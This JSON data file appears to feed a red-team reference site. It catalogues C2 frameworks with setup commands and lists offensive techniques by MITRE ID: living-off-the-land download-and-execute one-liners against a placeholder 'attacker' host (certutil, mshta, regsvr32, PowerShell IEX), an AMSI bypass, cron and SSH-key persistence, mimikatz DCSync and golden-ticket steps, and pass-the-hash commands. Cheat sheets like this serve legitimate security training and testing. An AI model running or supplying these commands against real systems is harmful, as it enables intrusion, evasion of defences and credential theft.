# src/data/redteam.json
{
  "sections": [
    {
      "id":"c2","name":"C2 Frameworks","description":"Command and Control frameworks for red team operations","items":[
        {"name":"Cobalt Strike","type":"Commercial","description":"Industry-standard adversary simulation and red team ops platform. Beacon payload for covert C2 communications.","features":["Beacon payload","Malleable C2 profiles","Pivoting","Lateral movement","Browser pivoting","SOCKS proxy"],"setup":"Commercial license required. Team server runs on Linux, client on any OS.","difficulty":"Hard"},
        {"name":"Empire (PowerShell Empire)","type":"Open Source","description":"Post-exploitation agent framework supporting PowerShell, Python, and C# agents.","features":["Starkiller GUI","PowerShell agents","Python agents","C# agents","Encrypted comms","Modular post-exploitation"],"setup":"git clone https://github.com/BC-SECURITY/Empire\ncd Empire\n./setup/install.sh\n./ps-empire server\n./ps-empire client","difficulty":"Medium"},
        {"name":"Covenant","type":"Open Source","description":".NET C2 framework with Grunt agents and a web-based interface.","features":["Web UI","Grunt agents",".NET framework","Task automation","Encrypted comms","Bridge listeners"],"setup":"git clone https://github.com/cobbr/Covenant\ncd Covenant/Covenant\ndotnet run","difficulty":"Medium"},
        {"name":"Sliver","type":"Open Source","description":"Modern cross-platform C2 framework by BishopFox with implant generation.","features":["mTLS/HTTP/DNS","Implant generation","Multi-player","Armory (extensions)","BOF support","Stagers"],"setup":"curl https://sliver.sh/install | sudo bash\nsliver-server","difficulty":"Medium"},
        {"name":"Mythic","type":"Open Source","description":"Collaborative, multi-platform C2 framework with customizable agents.","features":["Web interface","Docker-based","Multiple C2 profiles","Artifact generation","Team operations","Extensible agents"],"setup":"git clone https://github.com/its-a-feature/Mythic\ncd Mythic\n./mythic-cli install\n./mythic-cli start","difficulty":"Hard"},
        {"name":"Havoc","type":"Open Source","description":"Modern C2 framework with Demon agent, custom shellcode, and sleep masking.","features":["Demon agent","Sleep masking","Indirect syscalls","Custom shellcode","Token manipulation","BOF loading"],"setup":"git clone https://github.com/HavocFramework/Havoc\ncd Havoc\nmake\n./havoc server --profile profiles/havoc.yaotl","difficulty":"Hard"}
      ]
    },
    {
      "id":"lolbins","name":"Living off the Land","description":"Using legitimate Windows binaries for malicious purposes (LOLBins)","items":[
        {"name":"certutil","binary":"certutil.exe","description":"Certificate utility that can download files and encode/decode data","techniques":["certutil -urlcache -split -f http://attacker/payload.exe output.exe","certutil -encode payload.exe encoded.b64","certutil -decode encoded.b64 payload.exe"],"mitre":"T1105"},
        {"name":"mshta","binary":"mshta.exe","description":"Execute HTA files and inline VBScript/JavaScript","techniques":["mshta http://attacker/payload.hta","mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc\"\"\")","mshta javascript:a=GetObject(\"script:http://attacker/payload.sct\").Exec()"],"mitre":"T1218.005"},
        {"name":"rundll32","binary":"rundll32.exe","description":"Execute DLL functions and JavaScript","techniques":["rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe","rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();","rundll32.exe advpack.dll,LaunchINFSection payload.inf"],"mitre":"T1218.011"},
        {"name":"regsvr32","binary":"regsvr32.exe","description":"Register COM objects, can execute scripts remotely","techniques":["regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll","regsvr32 /s /n /u /i:payload.sct scrobj.dll"],"mitre":"T1218.010"},
        {"name":"bitsadmin","binary":"bitsadmin.exe","description":"Background file transfer and download","techniques":["bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\\temp\\payload.exe","bitsadmin /create 1 & bitsadmin /addfile 1 http://attacker/payload.exe C:\\temp\\payload.exe & bitsadmin /RESUME 1"],"mitre":"T1197"},
        {"name":"wmic","binary":"wmic.exe","description":"Windows Management Instrumentation for remote execution","techniques":["wmic process call create \"payload.exe\"","wmic /node:target process call create \"cmd /c command\"","wmic os get /format:\"http://attacker/payload.xsl\""],"mitre":"T1047"},
        {"name":"PowerShell","binary":"powershell.exe","description":"Powerful scripting engine for download/execute and post-exploitation","techniques":["powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')\"","powershell -enc <base64_encoded_command>","powershell -nop -w hidden -c \"IEX(iwr http://attacker/payload)\""],"mitre":"T1059.001"},
        {"name":"cscript/wscript","binary":"cscript.exe / wscript.exe","description":"Windows Script Host for VBS/JS execution","techniques":["cscript payload.vbs","wscript /e:javascript payload.js","cscript //nologo //e:jscript payload.js"],"mitre":"T1059.005"},
        {"name":"msiexec","binary":"msiexec.exe","description":"Install MSI packages, can execute remote payloads","techniques":["msiexec /q /i http://attacker/payload.msi","msiexec /y payload.dll","msiexec /z payload.dll"],"mitre":"T1218.007"},
        {"name":"InstallUtil","binary":"InstallUtil.exe","description":".NET installer utility for executing assemblies","techniques":["C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe"],"mitre":"T1218.004"}
      ]
    },
    {
      "id":"av-bypass","name":"AV/EDR Bypass","description":"Techniques for evading antivirus and endpoint detection","items":[
        {"name":"Process Injection","description":"Inject code into legitimate processes to evade detection","techniques":["Classic DLL Injection","Process Hollowing","Thread Hijacking","APC Injection","Shellcode Injection via NtCreateSection"],"tools":["Donut","ScareCrow","Shelter"],"difficulty":"Hard"},
        {"name":"AMSI Bypass","description":"Bypass Antimalware Scan Interface in PowerShell","techniques":["[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)","Memory patching AMSI.dll","CLR hooking","amsi.dll hijacking"],"tools":["amsi-bypass-powershell","AMSITrigger"],"difficulty":"Medium"},
        {"name":"Shellcode Obfuscation","description":"Transform shellcode to avoid signature detection","techniques":["XOR encryption","AES encryption","Custom encoding","Shellcode polymorphism","Sleep masking","Syscall obfuscation"],"tools":["msfvenom encoders","Veil-Evasion","Shikata Ga Nai"],"difficulty":"Hard"},
        {"name":"Unhooking","description":"Remove EDR hooks from ntdll.dll to execute unmonitored syscalls","techniques":["Fresh ntdll.dll copy from disk","Direct syscalls","Indirect syscalls","Hell's Gate / Halo's Gate","Module stomping"],"tools":["SysWhispers","SysWhispers2","SysWhispers3","InlineWhispers"],"difficulty":"Hard"},
        {"name":"ETW Bypass","description":"Disable Event Tracing for Windows to blind EDR solutions","techniques":["Patch EtwEventWrite","Disable ETW provider","ETW session manipulation"],"tools":["Custom scripts"],"difficulty":"Hard"},
        {"name":"Signature Evasion","description":"Modify payload to avoid static signature detection","techniques":["String obfuscation","Function name mangling","PE section manipulation","Timestomping","Resource modification","Icon replacement"],"tools":["ScareCrow","Nimcrypt2","pe-bear"],"difficulty":"Medium"},
        {"name":"Living off the Land","description":"Use legitimate system tools to avoid detection","techniques":["LOLBins execution","Script interpreters","Signed binary proxy execution","Trusted developer tools"],"tools":["LOLBAS Project","GTFOBins"],"difficulty":"Medium"}
      ]
    },
    {
      "id":"persistence","name":"Persistence","description":"Maintain access to compromised systems across reboots","items":[
        {"name":"Registry Run Keys","description":"Auto-execute on user login via registry","techniques":["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"],"mitre":"T1547.001","os":"Windows"},
        {"name":"Scheduled Tasks","description":"Create scheduled tasks to execute payloads","techniques":["schtasks /create /tn 'Update' /tr 'payload.exe' /sc onlogon","schtasks /create /tn 'Maintenance' /tr 'payload.exe' /sc daily /st 09:00","Linux: crontab -e, add '*/5 * * * * /tmp/payload'"],"mitre":"T1053","os":"Both"},
        {"name":"Startup Folder","description":"Place payloads in user/system startup folders","techniques":["C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\","C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"],"mitre":"T1547.001","os":"Windows"},
        {"name":"WMI Event Subscriptions","description":"WMI persistence through event subscriptions","techniques":["Create WMI event filter + consumer + binding","PowerShell: New-WmiEventSubscription","Autoruns can detect these"],"mitre":"T1546.003","os":"Windows"},
        {"name":"DLL Hijacking","description":"Replace or inject DLLs loaded by legitimate applications","techniques":["Find missing DLLs (Process Monitor)","Place malicious DLL in application directory","DLL search order hijacking","Phantom DLL hijacking"],"mitre":"T1574.001","os":"Windows"},
        {"name":"SSH Keys","description":"Add SSH authorized keys for persistent access","techniques":["echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys","chmod 600 ~/.ssh/authorized_keys","SSH key generation: ssh-keygen -t rsa"],"mitre":"T1098.004","os":"Linux"},
        {"name":"Cron Jobs","description":"Linux scheduled tasks for persistence","techniques":["crontab -e (user cron)","echo '*/5 * * * * /tmp/payload' > /etc/cron.d/update","@reboot /tmp/payload (run on boot)"],"mitre":"T1053.003","os":"Linux"},
        {"name":"Systemd Services","description":"Create malicious systemd services","techniques":["Create service file in /etc/systemd/system/","systemctl enable malicious.service","systemctl start malicious.service"],"mitre":"T1543.002","os":"Linux"},
        {"name":"Golden Ticket","description":"Forge Kerberos TGT with KRBTGT hash for permanent domain access","techniques":["Extract KRBTGT hash: mimikatz lsadump::dcsync /user:krbtgt","Forge ticket: kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH","Inject ticket: kerberos::ptt ticket.kirbi"],"mitre":"T1558.001","os":"Windows"},
        {"name":"Silver Ticket","description":"Forge Kerberos TGS for specific service access","techniques":["Extract service account hash","Forge ticket with service SPN","No domain controller communication needed"],"mitre":"T1558.002","os":"Windows"}
      ]
    },
    {
      "id":"privesc","name":"Privilege Escalation","description":"Escalate from low-privilege to admin/root access","items":[
        {"name":"Linux SUID Exploitation","description":"Exploit SUID binaries for root access","techniques":["find / -perm -4000 -type f 2>/dev/null","Check GTFOBins for SUID exploits","Custom SUID binary exploitation"],"tools":["GTFOBins","LinPEAS"],"os":"Linux"},
        {"name":"Linux Sudo Abuse","description":"Exploit sudo misconfigurations","techniques":["sudo -l (list permissions)","sudo -u#-1 /bin/bash (CVE-2019-14287)","Sudo version exploits","LD_PRELOAD with sudo"],"tools":["sudo_killer","LinPEAS"],"os":"Linux"},
        {"name":"Linux Kernel Exploits","description":"Exploit kernel vulnerabilities for root","techniques":["uname -r (check version)","DirtyCow (CVE-2016-5195)","DirtyPipe (CVE-2022-0847)","PwnKit (CVE-2021-4034)"],"tools":["linux-exploit-suggester","LinPEAS"],"os":"Linux"},
        {"name":"Windows Token Impersonation","description":"Impersonate privileged tokens","techniques":["Potato attacks (Hot/Sweet/Juicy/Rogue)","Token impersonation with Incognito","SeImpersonatePrivilege abuse","PrintSpoofer"],"tools":["JuicyPotato","PrintSpoofer","RoguePotato","GodPotato"],"os":"Windows"},
        {"name":"Windows Service Exploitation","description":"Exploit misconfigured Windows services","techniques":["Unquoted service paths","Weak service permissions","DLL hijacking in services","Binary path modification"],"tools":["PowerUp","WinPEAS","accesschk.exe"],"os":"Windows"},
        {"name":"Windows UAC Bypass","description":"Bypass User Account Control","techniques":["eventvwr.exe bypass","fodhelper.exe bypass","sdclt.exe bypass","UACME tool"],"tools":["UACME","Metasploit UAC modules"],"os":"Windows"}
      ]
    },
    {
      "id":"lateral","name":"Lateral Movement","description":"Move between systems within a network","items":[
        {"name":"Pass the Hash","description":"Authenticate using NTLM hash without knowing password","techniques":["crackmapexec smb target -u user -H hash","evil-winrm -i target -u user -H hash","impacket-psexec domain/user@target -hashes :hash","mimikatz sekurlsa::pth /user:user /domain:domain /ntlm:hash"],"mitre":"T1550.002"},
        {"name":"Pass the Ticket","description":"Use stolen Kerberos tickets for authentication","techniques":["Export ticket: mimikatz sekurlsa::tickets /export","Import ticket: mimikatz kerberos::ptt ticket.kirbi","Rubeus: Rubeus.exe ptt /ticket:ticket.kirbi","export KRB5CCNAME=ticket.ccache"],"mitre":"T1550.003"},
        {"name":"PSExec","description":"Remote execution using SMB and named pipes","techniques":["impacket-psexec domain/user:pass@target","PsExec.exe \\\\target -u user -p pass cmd.exe","Metasploit: exploit/windows/smb/psexec"],"mitre":"T1569.002"},
        {"name":"WMI Execution","description":"Remote command execution via WMI","techniques":["impacket-wmiexec domain/user:pass@target","wmic /node:target process call create 'cmd.exe /c command'","PowerShell: Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList 'command'"],"mitre":"T1047"},
        {"name":"WinRM","description":"Remote management using WinRM/PowerShell Remoting","techniques":["evil-winrm -i target -u user -p pass","Enter-PSSession -ComputerName target -Credential cred","Invoke-Command -ComputerName target -ScriptBlock { command }"],"mitre":"T1021.006"},
        {"name":"RDP Hijacking","description":"Hijack existing RDP sessions","techniques":["query user (list sessions)","tscon SESSION_ID /dest:rdp-tcp#0 (as SYSTEM)","SharpRDP for RDP execution"],"mitre":"T1563.002"},
        {"name":"SSH Pivoting","description":"Use SSH for tunneling and lateral movement","techniques":["ssh -L localport:target:remoteport pivot","ssh -D 9050 pivot (SOCKS proxy)","ssh -R remoteport:target:localport pivot","sshuttle -r pivot target_network/24"],"mitre":"T1021.004"}
      ]
    }
  ]
}
